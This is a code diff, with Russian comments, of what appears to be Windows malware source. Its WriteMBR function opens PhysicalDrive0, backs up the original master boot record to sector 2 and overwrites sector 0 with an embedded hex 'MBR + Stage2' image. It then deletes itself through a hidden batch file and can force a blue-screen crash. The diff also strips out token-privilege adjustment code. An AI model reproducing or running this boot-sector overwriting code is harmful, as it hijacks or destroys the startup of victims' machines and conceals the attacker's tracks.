@@ -79,31 +79,18 @@ std::vector<unsigned char> HexToBytes(const std::string& hex) {
     return bytes;
 }
 
-// === ЗАПИСЬ MBR ===
+// === ЗАПИСЬ MBR (С ПРАВИЛЬНЫМ СОХРАНЕНИЕМ ОРИГИНАЛА) ===
 void WriteMBR() {
     std::string hex(MBR_HEX);
     std::vector<unsigned char> image = HexToBytes(hex);
     
     if (image.size() < 512) return;
     
-    // Повышаем привилегии
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tkp;
-    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
-    LookupPrivilegeValueA(NULL, SE_BACKUP_NAME, &tkp.Privileges[0].Luid);
-    LookupPrivilegeValueA(NULL, SE_RESTORE_NAME, &tkp.Privileges[1].Luid);
-    LookupPrivilegeValueA(NULL, SE_SECURITY_NAME, &tkp.Privileges[2].Luid);
-    tkp.PrivilegeCount = 3;
-    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    tkp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
-    tkp.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
-    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
-    
     // Открываем диск
     HANDLE hDisk = CreateFileA(
         "\\\\.\\PhysicalDrive0",
-        GENERIC_WRITE,
-        FILE_SHARE_WRITE | FILE_SHARE_READ,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
         NULL,
         OPEN_EXISTING,
         FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
@@ -111,10 +98,11 @@ void WriteMBR() {
     );
     
     if (hDisk == INVALID_HANDLE_VALUE) {
+        // Fallback: обычный доступ
         hDisk = CreateFileA(
             "\\\\.\\PhysicalDrive0",
-            GENERIC_WRITE,
-            FILE_SHARE_WRITE,
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
             NULL,
             OPEN_EXISTING,
             0,
@@ -123,12 +111,31 @@ void WriteMBR() {
         if (hDisk == INVALID_HANDLE_VALUE) return;
     }
     
-    // Записываем ВЕСЬ образ (MBR + Stage2)
-    DWORD bytesWritten;
+    // --- ШАГ 1: ЧИТАЕМ ОРИГИНАЛЬНЫЙ MBR (сектор 0) ---
+    unsigned char originalMBR[512];
+    DWORD bytesRead = 0;
+    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
+    if (!ReadFile(hDisk, originalMBR, 512, &bytesRead, NULL) || bytesRead != 512) {
+        CloseHandle(hDisk);
+        return;
+    }
+    
+    // --- ШАГ 2: СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОР 2 ---
+    DWORD bytesWritten = 0;
+    SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
+    if (!WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL) || bytesWritten != 512) {
+        CloseHandle(hDisk);
+        return;
+    }
+    
+    // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ (MBR + Stage2) ---
+    // Сектор 0: MBR
+    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
     WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
+    
     CloseHandle(hDisk);
     
-    // Самоуничтожение
+    // --- Самоуничтожение ---
     char szPath[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     
@@ -149,7 +156,7 @@ void WriteMBR() {
     CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
-    // BSOD
+    // --- BSOD (если включён) ---
     if (FindResourceA(NULL, "BSOD", "SETTING")) {
         TriggerBSOD();
     }
